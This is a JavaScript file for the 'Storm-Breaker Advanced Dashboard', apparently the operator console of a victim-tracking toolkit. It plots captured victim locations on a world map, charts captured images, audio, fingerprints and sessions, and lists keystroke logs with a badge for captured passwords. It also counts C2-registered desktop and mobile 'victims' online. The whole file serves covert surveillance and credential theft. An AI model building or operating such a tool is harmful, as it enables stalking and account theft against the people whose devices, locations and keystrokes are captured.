/**
 * Storm-Breaker Advanced Dashboard
 * Chart.js analytics, Leaflet world map, fingerprints, keystrokes, intel
 */

// ===== CHART.JS INITIALIZATION =====
let activityChart = null;
let captureChart = null;
let worldMap = null;
let mapMarkers = [];

function initActivityChart() {
    const ctx = document.getElementById('activity-chart');
    if (!ctx) return;

    activityChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'Events',
                data: [],
                borderColor: '#3b82f6',
                backgroundColor: 'rgba(59, 130, 246, 0.1)',
                fill: true,
                tension: 0.4,
                borderWidth: 2,
                pointRadius: 0,
                pointHoverRadius: 4,
                pointHoverBackgroundColor: '#3b82f6',
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: { display: false },
                tooltip: {
                    backgroundColor: '#1e293b',
                    borderColor: '#334155',
                    borderWidth: 1,
                    titleColor: '#e2e8f0',
                    bodyColor: '#94a3b8',
                    cornerRadius: 8,
                    padding: 10,
                }
            },
            scales: {
                x: {
                    grid: { color: 'rgba(51,65,85,0.3)', drawBorder: false },
                    ticks: { color: '#475569', font: { size: 10 }, maxTicksLimit: 12 }
                },
                y: {
                    beginAtZero: true,
                    grid: { color: 'rgba(51,65,85,0.3)', drawBorder: false },
                    ticks: { color: '#475569', font: { size: 10 }, stepSize: 1 }
                }
            },
            interaction: { intersect: false, mode: 'index' }
        }
    });
}

function updateActivityChart() {
    const hours = document.getElementById('chart-timeframe')?.value || 24;
    $.get('/api/analytics/timeline?hours=' + hours, function(data) {
        if (activityChart && data.timeline) {
            activityChart.data.labels = data.timeline.map(t => t.label);
            activityChart.data.datasets[0].data = data.timeline.map(t => t.count);
            activityChart.update('none');
        }
    });
}

// ===== LEAFLET WORLD MAP =====
function initWorldMap() {
    const mapEl = document.getElementById('world-map');
    if (!mapEl || worldMap) return;

    worldMap = L.map('world-map', {
        center: [20, 0],
        zoom: 2,
        zoomControl: true,
        attributionControl: false,
    });

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 18,
    }).addTo(worldMap);

    // Fix map size after container is visible
    setTimeout(() => worldMap.invalidateSize(), 200);
    
    updateMapMarkers();
}

function updateMapMarkers() {
    if (!worldMap) return;

    $.get('/api/analytics/geo', function(data) {
        // Clear existing markers
        mapMarkers.forEach(m => worldMap.removeLayer(m));
        mapMarkers = [];

        if (data.locations && data.locations.length > 0) {
            data.locations.forEach(function(loc) {
                const marker = L.circleMarker([loc.lat, loc.lng], {
                    radius: 6,
                    fillColor: '#3b82f6',
                    color: '#1e40af',
                    weight: 2,
                    opacity: 0.9,
                    fillOpacity: 0.7
                }).addTo(worldMap);

                marker.bindPopup(`
                    <div style="font-family: 'Outfit', sans-serif; font-size: 12px; color: #1e293b;">
                        <strong>📍 ${loc.lat.toFixed(4)}, ${loc.lng.toFixed(4)}</strong><br>
                        <span style="color: #64748b;">Template: ${loc.template || 'Unknown'}</span><br>
                        <span style="color: #64748b;">IP: ${loc.ip || 'Unknown'}</span><br>
                        <span style="color: #94a3b8;">${new Date(loc.timestamp).toLocaleString()}</span>
                    </div>
                `);

                mapMarkers.push(marker);
            });

            // Fit bounds if there are markers
            if (mapMarkers.length > 0) {
                const group = L.featureGroup(mapMarkers);
                worldMap.fitBounds(group.getBounds().pad(0.2));
            }

            document.getElementById('map-victim-count').textContent = data.locations.length + ' locations tracked';
        }
    });
}

// ===== ANALYTICS TAB =====
function refreshAnalytics() {
    // System info
    $.get('/api/system/info', function(data) {
        $('#analytics-cpu').text(Math.round(data.cpu_percent) + '%');
        $('#analytics-cpu-bar').css('width', data.cpu_percent + '%');
        
        $('#analytics-mem').text(Math.round(data.memory.percent) + '%');
        $('#analytics-mem-bar').css('width', data.memory.percent + '%');
        
        $('#analytics-disk').text(Math.round(data.disk.percent) + '%');
        $('#analytics-disk-bar').css('width', data.disk.percent + '%');
        
        $('#analytics-platform').text(data.os || '-');
        $('#analytics-python').text(data.python || '-');
        
        var uptime = data.uptime;
        var h = Math.floor(uptime / 3600);
        var m = Math.floor((uptime % 3600) / 60);
        $('#analytics-uptime').text(h + 'h ' + m + 'm');

        // Network interfaces for intel
        if (data.network_interfaces) {
            var netHtml = '';
            data.network_interfaces.forEach(function(iface) {
                netHtml += `<div class="bg-slate-800/50 rounded-lg p-2 mb-1">
                    <div class="text-slate-300 font-mono">${iface.name}</div>
                    <div class="text-blue-400 font-mono">${iface.ip}</div>
                    <div class="text-slate-600">${iface.netmask || ''}</div>
                </div>`;
            });
            $('#intel-network').html(netHtml || '<div class="text-slate-600">No interfaces</div>');
        }

        // Server details for intel
        $('#intel-server').html(`
            <div class="space-y-1">
                <div class="flex justify-between"><span class="text-slate-500">Hostname:</span><span class="text-white font-mono">${data.hostname || '-'}</span></div>
                <div class="flex justify-between"><span class="text-slate-500">OS:</span><span class="text-white font-mono">${data.os || '-'}</span></div>
                <div class="flex justify-between"><span class="text-slate-500">Architecture:</span><span class="text-white font-mono">${data.architecture || '-'}</span></div>
                <div class="flex justify-between"><span class="text-slate-500">CPU Cores:</span><span class="text-white font-mono">${data.cpu_count || '-'}</span></div>
                <div class="flex justify-between"><span class="text-slate-500">Local IP:</span><span class="text-blue-400 font-mono">${data.local_ip || '-'}</span></div>
                <div class="flex justify-between"><span class="text-slate-500">Port:</span><span class="text-emerald-400 font-mono">2525</span></div>
            </div>
        `);
    });

    // Dashboard stats for charts
    $.get('/api/analytics/dashboard', function(data) {
        if (data.activity) {
            $('#analytics-ips').text(data.activity.unique_ips);
        }

        // Capture breakdown doughnut
        if (data.captures && document.getElementById('capture-breakdown-chart')) {
            if (captureChart) captureChart.destroy();
            
            captureChart = new Chart(document.getElementById('capture-breakdown-chart'), {
                type: 'doughnut',
                data: {
                    labels: ['Images', 'Audio', 'Fingerprints', 'Keystrokes', 'Sessions'],
                    datasets: [{
                        data: [
                            data.captures.images,
                            data.captures.audio,
                            data.captures.fingerprints,
                            data.captures.keystrokes,
                            data.captures.sessions
                        ],
                        backgroundColor: [
                            'rgba(168, 85, 247, 0.8)',
                            'rgba(236, 72, 153, 0.8)',
                            'rgba(59, 130, 246, 0.8)',
                            'rgba(239, 68, 68, 0.8)',
                            'rgba(16, 185, 129, 0.8)'
                        ],
                        borderColor: '#0f172a',
                        borderWidth: 3,
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    cutout: '65%',
                    plugins: {
                        legend: {
                            position: 'bottom',
                            labels: {
                                color: '#94a3b8',
                                font: { size: 11 },
                                padding: 15,
                                usePointStyle: true,
                                pointStyleWidth: 10
                            }
                        }
                    }
                }
            });
        }

        // Active connections for intel
        if (data.victims) {
            var connHtml = `
                <div class="bg-emerald-500/10 rounded-lg p-2 mb-1 border border-emerald-500/20">
                    <div class="text-emerald-400 font-bold">${data.victims.c2_active} Desktop Online</div>
                    <div class="text-slate-500 text-[10px]">${data.victims.c2_total} total registered</div>
                </div>
                <div class="bg-blue-500/10 rounded-lg p-2 mb-1 border border-blue-500/20">
                    <div class="text-blue-400 font-bold">${data.victims.mobile_active} Mobile Online</div>
                    <div class="text-slate-500 text-[10px]">${data.victims.mobile_total} total registered</div>
                </div>
                <div class="bg-slate-800/50 rounded-lg p-2">
                    <div class="text-white font-bold">${data.victims.total_all} Total Connections</div>
                </div>
            `;
            $('#intel-connections').html(connHtml);
        }

        // Event log for intel
        if (data.recent_events) {
            renderEventLog(data.recent_events);
        }
    });

    // Load fingerprints
    loadFingerprints();
    
    // Load keystrokes
    loadKeystrokes();
}

function loadFingerprints() {
    $.get('/api/fingerprints/list', function(data) {
        var container = document.getElementById('fingerprints-table');
        if (!container) return;

        if (data.fingerprints && data.fingerprints.length > 0) {
            var html = '<table class="w-full text-xs"><thead class="border-b border-slate-800"><tr>' +
                '<th class="text-left py-2 px-3 text-slate-500">Hash</th>' +
                '<th class="text-left py-2 px-3 text-slate-500">Platform</th>' +
                '<th class="text-left py-2 px-3 text-slate-500">Screen</th>' +
                '<th class="text-left py-2 px-3 text-slate-500">Browser</th>' +
                '<th class="text-right py-2 px-3 text-slate-500">Time</th>' +
                '</tr></thead><tbody>';

            data.fingerprints.forEach(function(fp) {
                html += `<tr class="border-b border-slate-800/50 hover:bg-slate-800/30">
                    <td class="py-2 px-3 font-mono text-blue-400">${fp.hash.substring(0, 16)}...</td>
                    <td class="py-2 px-3 text-slate-300">${fp.platform}</td>
                    <td class="py-2 px-3 text-slate-400">${fp.screen}</td>
                    <td class="py-2 px-3 text-slate-400 truncate max-w-[200px]">${fp.browser}</td>
                    <td class="py-2 px-3 text-right text-slate-500">${new Date(fp.timestamp * 1000).toLocaleString()}</td>
                </tr>`;
            });

            html += '</tbody></table>';
            container.innerHTML = html;
        } else {
            container.innerHTML = '<div class="text-xs text-slate-600 py-4 text-center">No fingerprints captured yet</div>';
        }
    });
}

function loadKeystrokes() {
    $.get('/api/keystrokes/list', function(data) {
        var container = document.getElementById('keystrokes-table');
        if (!container) return;

        if (data.keystrokes && data.keystrokes.length > 0) {
            var html = '<table class="w-full text-xs"><thead class="border-b border-slate-800"><tr>' +
                '<th class="text-left py-2 px-3 text-slate-500">File</th>' +
                '<th class="text-left py-2 px-3 text-slate-500">URL</th>' +
                '<th class="text-center py-2 px-3 text-slate-500">Keys</th>' +
                '<th class="text-center py-2 px-3 text-slate-500">Passwords</th>' +
                '<th class="text-right py-2 px-3 text-slate-500">Time</th>' +
                '<th class="text-right py-2 px-3 text-slate-500">Actions</th>' +
                '</tr></thead><tbody>';

            data.keystrokes.forEach(function(ks) {
                var pwBadge = ks.passwords > 0 ? 
                    '<span class="px-1.5 py-0.5 bg-red-500/20 text-red-400 rounded-full">' + ks.passwords + '</span>' : 
                    '<span class="text-slate-600">0</span>';

                html += `<tr class="border-b border-slate-800/50 hover:bg-slate-800/30">
                    <td class="py-2 px-3 font-mono text-slate-300">${ks.filename}</td>
                    <td class="py-2 px-3 text-slate-400 truncate max-w-[150px]">${ks.url}</td>
                    <td class="py-2 px-3 text-center text-slate-300">${ks.count}</td>
                    <td class="py-2 px-3 text-center">${pwBadge}</td>
                    <td class="py-2 px-3 text-right text-slate-500">${new Date(ks.timestamp * 1000).toLocaleString()}</td>
                    <td class="py-2 px-3 text-right">
                        <button onclick="viewKeystrokeFile('${ks.filename}')" class="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-[10px] hover:bg-blue-500/20 border border-blue-500/20">
                            <i class="fas fa-eye"></i> View
                        </button>
                    </td>
                </tr>`;
            });

            html += '</tbody></table>';
            container.innerHTML = html;
        } else {
            container.innerHTML = '<div class="text-xs text-slate-600 py-4 text-center">No keystroke logs yet</div>';
        }
    });
}

function viewKeystrokeFile(filename) {
    $.get('/api/keystrokes/view/' + filename, function(data) {
        if (data.logs) {
            var content = data.logs.map(function(log) {
                var target = log.target || {};
                return `[${log.type || 'key'}] ${log.key || log.data || ''} → ${target.tag || ''}${target.type === 'password' ? ' 🔑 PASSWORD' : ''}`;
            }).join('\n');

            if (window.Swal) {
                Swal.fire({
                    title: 'Keystroke Log: ' + filename,
                    html: '<pre style="text-align: left; font-size: 11px; max-height: 400px; overflow-y: auto; color: #e2e8f0; background: #0f172a; padding: 12px; border-radius: 8px; white-space: pre-wrap;">' + content + '</pre>',
                    width: 700,
                    background: '#1e293b',
                    color: '#fff',
                });
            }
        }
    });
}

// ===== INTEL TAB =====
function loadIntelData() {
    refreshAnalytics();
}

function renderEventLog(events) {
    var container = document.getElementById('intel-event-log');
    if (!container) return;

    var html = '';
    events.slice().reverse().forEach(function(ev) {
        var severityMap = {
            'location_capture': 'border-emerald-500',
            'image_capture': 'border-purple-500',
            'c2_register': 'border-yellow-500',
            'mobile_register': 'border-blue-500',
        };
        var borderClass = severityMap[ev.type] || 'border-slate-700';
        var time = new Date(ev.timestamp).toLocaleString();

        html += `<div class="event-log-item flex items-start space-x-3 text-xs py-2 px-3 rounded border-l-2 ${borderClass} hover:bg-slate-800/30 transition-colors">
            <span class="text-slate-600 whitespace-nowrap">${time}</span>
            <span class="text-slate-300 font-medium">${ev.type.replace(/_/g, ' ').toUpperCase()}</span>
            <span class="text-slate-500 truncate">${ev.ip || ''}</span>
            <span class="text-slate-600 truncate">${JSON.stringify(ev.details || {}).substring(0, 60)}</span>
        </div>`;
    });

    container.innerHTML = html || '<div class="text-xs text-slate-600 py-4 text-center">No events recorded</div>';
}

function filterEvents() {
    var query = document.getElementById('event-search')?.value.toLowerCase() || '';
    document.querySelectorAll('.event-log-item').forEach(function(item) {
        item.style.display = item.textContent.toLowerCase().includes(query) ? '' : 'none';
    });
}

function exportEvents() {
    $.get('/api/analytics/dashboard', function(data) {
        if (data.recent_events) {
            var text = JSON.stringify(data.recent_events, null, 2);
            var blob = new Blob([text], { type: 'application/json' });
            var link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'storm_events_' + new Date().toISOString().slice(0, 10) + '.json';
            link.click();
        }
    });
}

// ===== INITIALIZATION =====
window.addEventListener('load', function() {
    // Initialize chart
    setTimeout(function() {
        initActivityChart();
        updateActivityChart();

        // Initialize map
        initWorldMap();

        // Refresh chart and map periodically
        setInterval(function() {
            updateActivityChart();
            updateMapMarkers();
        }, 30000); // Every 30 seconds
    }, 500);
});
